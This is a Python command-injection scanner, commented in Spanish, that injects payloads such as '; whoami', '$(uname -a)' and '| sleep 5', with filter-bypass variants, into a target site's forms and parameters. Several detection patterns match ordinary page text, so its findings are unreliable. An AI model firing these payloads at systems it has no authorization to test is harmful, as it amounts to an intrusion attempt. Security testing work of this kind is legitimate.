import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from datetime import datetime
import time
import re
import platform

class CommandInjectionScanner:
    def __init__(self):
        # Payloads para inyección de comandos
        self.command_payloads = {
            'unix_linux': [
                # Comandos básicos
                '; ls',
                '| ls',
                '&& ls',
                '|| ls',
                '`ls`',
                '$(ls)',
                
                # Comandos con output
                '; whoami',
                '| whoami',
                '&& whoami',
                '|| whoami',
                '`whoami`',
                '$(whoami)',
                
                # Comandos de tiempo
                '; sleep 5',
                '| sleep 5',
                '&& sleep 5',
                '|| sleep 5',
                '`sleep 5`',
                '$(sleep 5)',
                
                # Comandos de información del sistema
                '; uname -a',
                '| uname -a',
                '&& uname -a',
                '|| uname -a',
                '`uname -a`',
                '$(uname -a)',
                
                # Comandos de red
                '; ping -c 1 127.0.0.1',
                '| ping -c 1 127.0.0.1',
                '&& ping -c 1 127.0.0.1',
                '|| ping -c 1 127.0.0.1',
                
                # Comandos con encoding
                '%3B%20ls',
                '%7C%20ls',
                '%26%26%20ls',
                
                # Bypass de filtros
                ';ls',
                '|ls',
                '&&ls',
                '||ls',
                '; l\\s',
                '| l\\s',
                '; /bin/ls',
                '| /bin/ls'
            ],
            'windows': [
                # Comandos básicos
                '& dir',
                '| dir',
                '&& dir',
                '|| dir',
                
                # Comandos con output
                '& whoami',
                '| whoami',
                '&& whoami',
                '|| whoami',
                
                # Comandos de tiempo
                '& timeout 5',
                '| timeout 5',
                '&& timeout 5',
                '|| timeout 5',
                
                # Comandos de información del sistema
                '& systeminfo',
                '| systeminfo',
                '&& systeminfo',
                '|| systeminfo',
                
                # Comandos de red
                '& ping 127.0.0.1',
                '| ping 127.0.0.1',
                '&& ping 127.0.0.1',
                '|| ping 127.0.0.1',
                
                # Comandos con encoding
                '%26%20dir',
                '%7C%20dir',
                
                # Bypass de filtros
                '&dir',
                '|dir',
                '&&dir',
                '||dir'
            ]
        }
        
        # Patrones para detectar output de comandos
        self.command_output_patterns = {
            'unix_linux': [
                # Outputs de ls
                r'drwx',
                r'-rw-',
                r'total \d+',
                r'\.{1,2}\s',
                
                # Outputs de whoami
                r'root|www-data|apache|nginx|nobody',
                
                # Outputs de uname
                r'Linux.*GNU',
                r'Darwin.*kernel',
                r'x86_64|i386|armv',
                
                # Outputs de ping
                r'\d+ packets transmitted',
                r'PING.*bytes of data',
                r'64 bytes from',
                
                # Outputs de comandos generales
                r'/bin/|/usr/bin/|/sbin/',
                r'Permission denied',
                r'No such file or directory',
                r'command not found'
            ],
            'windows': [
                # Outputs de dir
                r'Directory of',
                r'<DIR>',
                r'\d+/\d+/\d+\s+\d+:\d+',
                r'bytes free',
                
                # Outputs de whoami
                r'\\\\.*\\\\',
                r'NT AUTHORITY',
                r'BUILTIN\\\\',
                
                # Outputs de systeminfo
                r'Host Name:',
                r'OS Name:',
                r'System Type:',
                r'Windows',
                
                # Outputs de ping
                r'Pinging.*with \d+ bytes',
                r'Reply from',
                r'Packets: Sent = \d+',
                
                # Outputs generales
                r'C:\\\\',
                r'Access is denied',
                r'The system cannot find'
            ]
        }
        
        # Comandos que causan delay
        self.time_based_commands = [
            'sleep 5', 'timeout 5', 'ping -c 5 127.0.0.1', 'ping -n 5 127.0.0.1'
        ]
    
    def scan_command_injection(self, target_url, deep_scan=False):
        """
        Escanea vulnerabilidades de inyección de comandos en el sitio objetivo
        """
        results = {
            'target': target_url,
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'forms_tested': [],
            'urls_tested': [],
            'parameters_tested': [],
            'errors': []
        }
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        try:
            # Obtener la página principal
            response = requests.get(
                target_url,
                timeout=15,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code == 200:
                # Buscar formularios para testing
                self._scan_forms_cmdi(target_url, response.text, results)
                
                # Buscar parámetros GET para testing
                self._scan_get_parameters_cmdi(target_url, results)
                
                # Si es escaneo profundo, buscar más URLs
                if deep_scan:
                    self._deep_scan_links_cmdi(target_url, response.text, results)
            
        except requests.exceptions.RequestException as e:
            results['errors'].append(f"Error accediendo al sitio: {str(e)}")
        except Exception as e:
            results['errors'].append(f"Error inesperado: {str(e)}")
        
        return results
    
    def _scan_forms_cmdi(self, base_url, html_content, results):
        """
        Escanea formularios en busca de vulnerabilidades de inyección de comandos
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_info = self._analyze_form_cmdi(form, base_url)
                results['forms_tested'].append(form_info)
                
                # Probar inyección de comandos en cada campo del formulario
                # Usar payloads tanto de Unix/Linux como Windows
                all_payloads = self.command_payloads['unix_linux'][:6] + self.command_payloads['windows'][:4]
                
                for payload in all_payloads:
                    vulnerability = self._test_form_cmdi(form_info, payload, base_url)
                    if vulnerability:
                        results['vulnerabilities'].append(vulnerability)
                        
        except Exception as e:
            results['errors'].append(f"Error escaneando formularios: {str(e)}")
    
    def _analyze_form_cmdi(self, form, base_url):
        """
        Analiza un formulario para command injection testing
        """
        form_info = {
            'action': form.get('action', ''),
            'method': form.get('method', 'get').lower(),
            'fields': [],
            'full_action_url': ''
        }
        
        # Construir URL completa de acción
        if form_info['action']:
            form_info['full_action_url'] = urljoin(base_url, form_info['action'])
        else:
            form_info['full_action_url'] = base_url
        
        # Extraer campos del formulario
        inputs = form.find_all(['input', 'textarea', 'select'])
        for input_field in inputs:
            field_info = {
                'name': input_field.get('name', ''),
                'type': input_field.get('type', 'text'),
                'value': input_field.get('value', ''),
                'required': input_field.has_attr('required')
            }
            if field_info['name']:
                form_info['fields'].append(field_info)
        
        return form_info
    
    def _test_form_cmdi(self, form_info, payload, base_url):
        """
        Prueba un payload de inyección de comandos en un formulario
        """
        try:
            # Preparar datos del formulario
            form_data = {}
            vulnerable_field = None
            
            for field in form_info['fields']:
                if field['type'] not in ['submit', 'button', 'hidden']:
                    # Probar el payload en campos que podrían ser vulnerables
                    if field['type'] in ['text', 'search', 'url', 'email'] or 'name' in field['name'].lower() or 'file' in field['name'].lower():
                        form_data[field['name']] = f"test{payload}"
                        if not vulnerable_field:
                            vulnerable_field = field['name']
                    else:
                        form_data[field['name']] = 'test'
                elif field['type'] == 'hidden':
                    form_data[field['name']] = field['value']
            
            # Obtener respuesta normal primero
            normal_data = {}
            for field in form_info['fields']:
                if field['type'] not in ['submit', 'button', 'hidden']:
                    normal_data[field['name']] = 'test'
                elif field['type'] == 'hidden':
                    normal_data[field['name']] = field['value']
            
            # Enviar petición normal
            normal_response = None
            normal_time = 0
            try:
                start_time = time.time()
                if form_info['method'] == 'post':
                    normal_response = requests.post(
                        form_info['full_action_url'],
                        data=normal_data,
                        timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )
                else:
                    normal_response = requests.get(
                        form_info['full_action_url'],
                        params=normal_data,
                        timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )
                normal_time = time.time() - start_time
            except:
                pass
            
            # Enviar petición con payload
            start_time = time.time()
            if form_info['method'] == 'post':
                response = requests.post(
                    form_info['full_action_url'],
                    data=form_data,
                    timeout=20,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
            else:
                response = requests.get(
                    form_info['full_action_url'],
                    params=form_data,
                    timeout=20,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
            
            response_time = time.time() - start_time
            
            # Verificar diferentes tipos de command injection
            vulnerability = self._analyze_cmdi_response(
                response, normal_response, payload, response_time, normal_time,
                form_info['full_action_url'], vulnerable_field, 'Form submission'
            )
            
            return vulnerability
                
        except requests.exceptions.RequestException as e:
            return None
        except Exception as e:
            return None
    
    def _scan_get_parameters_cmdi(self, target_url, results):
        """
        Escanea parámetros GET en busca de vulnerabilidades de inyección de comandos
        """
        try:
            parsed_url = urlparse(target_url)
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                
                for param_name, param_values in params.items():
                    results['parameters_tested'].append({
                        'parameter': param_name,
                        'original_value': param_values[0] if param_values else ''
                    })
                    
                    # Probar inyección de comandos en cada parámetro
                    test_payloads = self.command_payloads['unix_linux'][:3] + self.command_payloads['windows'][:2]
                    for payload in test_payloads:
                        vulnerability = self._test_get_parameter_cmdi(target_url, param_name, payload)
                        if vulnerability:
                            results['vulnerabilities'].append(vulnerability)
                            
        except Exception as e:
            results['errors'].append(f"Error escaneando parámetros GET: {str(e)}")
    
    def _test_get_parameter_cmdi(self, target_url, param_name, payload):
        """
        Prueba un payload de inyección de comandos en un parámetro GET específico
        """
        try:
            parsed_url = urlparse(target_url)
            params = parse_qs(parsed_url.query)
            original_value = params[param_name][0] if params[param_name] else ''
            
            # Obtener respuesta normal
            normal_response = None
            normal_time = 0
            try:
                start_time = time.time()
                normal_response = requests.get(target_url, timeout=10)
                normal_time = time.time() - start_time
            except:
                pass
            
            # Reemplazar el valor del parámetro con el payload
            params[param_name] = [f"{original_value}{payload}"]
            
            # Reconstruir la URL
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # Realizar petición
            start_time = time.time()
            response = requests.get(
                test_url,
                timeout=20,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            response_time = time.time() - start_time
            
            # Analizar respuesta
            vulnerability = self._analyze_cmdi_response(
                response, normal_response, payload, response_time, normal_time,
                test_url, param_name, 'GET parameter'
            )
            
            return vulnerability
                
        except requests.exceptions.RequestException:
            return None
        except Exception:
            return None
    
    def _deep_scan_links_cmdi(self, base_url, html_content, results):
        """
        Escaneo profundo de enlaces para inyección de comandos
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            links = soup.find_all('a', href=True)
            
            tested_urls = set()
            for link in links[:3]:  # Limitar para no sobrecargar
                href = link['href']
                full_url = urljoin(base_url, href)
                
                # Evitar URLs externas y duplicadas
                if urlparse(full_url).netloc == urlparse(base_url).netloc and full_url not in tested_urls:
                    tested_urls.add(full_url)
                    results['urls_tested'].append(full_url)
                    
                    # Probar inyección de comandos agregando parámetros
                    test_payloads = self.command_payloads['unix_linux'][:2]
                    for payload in test_payloads:
                        test_url = f"{full_url}{'&' if '?' in full_url else '?'}cmd=test{payload}"
                        vulnerability = self._test_url_cmdi(test_url, payload, 'cmd')
                        if vulnerability:
                            results['vulnerabilities'].append(vulnerability)
                            
        except Exception as e:
            results['errors'].append(f"Error en escaneo profundo: {str(e)}")
    
    def _test_url_cmdi(self, test_url, payload, param_name):
        """
        Prueba inyección de comandos en una URL específica
        """
        try:
            # Obtener respuesta normal
            base_url = test_url.split('?')[0]
            normal_response = None
            normal_time = 0
            try:
                start_time = time.time()
                normal_response = requests.get(base_url, timeout=10)
                normal_time = time.time() - start_time
            except:
                pass
            
            start_time = time.time()
            response = requests.get(
                test_url,
                timeout=20,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            response_time = time.time() - start_time
            
            vulnerability = self._analyze_cmdi_response(
                response, normal_response, payload, response_time, normal_time,
                test_url, param_name, 'URL parameter injection'
            )
            
            return vulnerability
                
        except requests.exceptions.RequestException:
            return None
        except Exception:
            return None
    
    def _analyze_cmdi_response(self, response, normal_response, payload, response_time, normal_time, url, parameter, method):
        """
        Analiza la respuesta para detectar inyección de comandos
        """
        # 1. Verificar output de comandos en la respuesta
        for os_type, patterns in self.command_output_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE | re.MULTILINE):
                    return {
                        'type': 'Command Injection (Output-based)',
                        'method': method,
                        'url': url,
                        'payload': payload,
                        'parameter': parameter,
                        'evidence': self._extract_command_evidence(response.text, pattern),
                        'severity': 'High',
                        'detection_method': f'Command output pattern ({os_type})',
                        'os_type': os_type
                    }
        
        # 2. Verificar time-based command injection
        if any(time_cmd in payload for time_cmd in self.time_based_commands):
            time_diff = response_time - normal_time if normal_time > 0 else response_time
            if time_diff > 4:  # Si tardó más de 4 segundos adicionales
                return {
                    'type': 'Time-based Command Injection',
                    'method': method,
                    'url': url,
                    'payload': payload,
                    'parameter': parameter,
                    'evidence': f'Response time: {response_time:.2f}s (normal: {normal_time:.2f}s, diff: {time_diff:.2f}s)',
                    'severity': 'High',
                    'detection_method': 'Time delay analysis'
                }
        
        # 3. Verificar errores de sistema que indican ejecución de comandos
        error_patterns = [
            r'sh: .*: command not found',
            r'bash: .*: command not found',
            r'cmd: .*: not found',
            r'Permission denied',
            r'Access is denied',
            r'The system cannot find the file specified',
            r'No such file or directory',
            r'/bin/sh: .*: not found'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return {
                    'type': 'Command Injection (Error-based)',
                    'method': method,
                    'url': url,
                    'payload': payload,
                    'parameter': parameter,
                    'evidence': self._extract_command_evidence(response.text, pattern),
                    'severity': 'High',
                    'detection_method': 'System error pattern'
                }
        
        # 4. Verificar diferencias significativas en el contenido
        if normal_response and normal_response.status_code == 200:
            content_diff = abs(len(response.text) - len(normal_response.text))
            if content_diff > 200:  # Diferencia significativa
                # Verificar si la diferencia contiene patrones de comando
                if len(response.text) > len(normal_response.text):
                    extra_content = response.text[len(normal_response.text):]
                    for os_type, patterns in self.command_output_patterns.items():
                        for pattern in patterns:
                            if re.search(pattern, extra_content, re.IGNORECASE):
                                return {
                                    'type': 'Command Injection (Content-based)',
                                    'method': method,
                                    'url': url,
                                    'payload': payload,
                                    'parameter': parameter,
                                    'evidence': f'Additional content detected with command patterns',
                                    'severity': 'Medium',
                                    'detection_method': 'Content analysis'
                                }
        
        return None
    
    def _extract_command_evidence(self, response_text, pattern):
        """
        Extrae evidencia de la ejecución de comandos
        """
        match = re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE)
        if match:
            # Obtener contexto alrededor del match
            start = max(0, match.start() - 150)
            end = min(len(response_text), match.end() + 150)
            context = response_text[start:end]
            return context.replace('\\n', ' ').replace('\\t', ' ').strip()[:400]  # Limitar a 400 caracteres
        return "Command execution evidence detected in response"
    
    def get_vulnerability_summary(self, results):
        """
        Genera un resumen de las vulnerabilidades de inyección de comandos encontradas
        """
        summary = {
            'total_vulnerabilities': len(results['vulnerabilities']),
            'high_severity': 0,
            'medium_severity': 0,
            'low_severity': 0,
            'vulnerability_types': {},
            'affected_parameters': [],
            'detection_methods': {},
            'os_types_detected': []
        }
        
        for vuln in results['vulnerabilities']:
            # Contar por severidad
            severity = vuln.get('severity', 'Medium')
            if severity == 'High':
                summary['high_severity'] += 1
            elif severity == 'Medium':
                summary['medium_severity'] += 1
            else:
                summary['low_severity'] += 1
            
            # Contar por tipo
            vuln_type = vuln.get('type', 'Unknown')
            summary['vulnerability_types'][vuln_type] = summary['vulnerability_types'].get(vuln_type, 0) + 1
            
            # Parámetros afectados
            param = vuln.get('parameter', '')
            if param and param not in summary['affected_parameters']:
                summary['affected_parameters'].append(param)
            
            # Métodos de detección
            detection_method = vuln.get('detection_method', 'Unknown')
            summary['detection_methods'][detection_method] = summary['detection_methods'].get(detection_method, 0) + 1
            
            # Tipos de OS detectados
            os_type = vuln.get('os_type', '')
            if os_type and os_type not in summary['os_types_detected']:
                summary['os_types_detected'].append(os_type)
        
        return summary

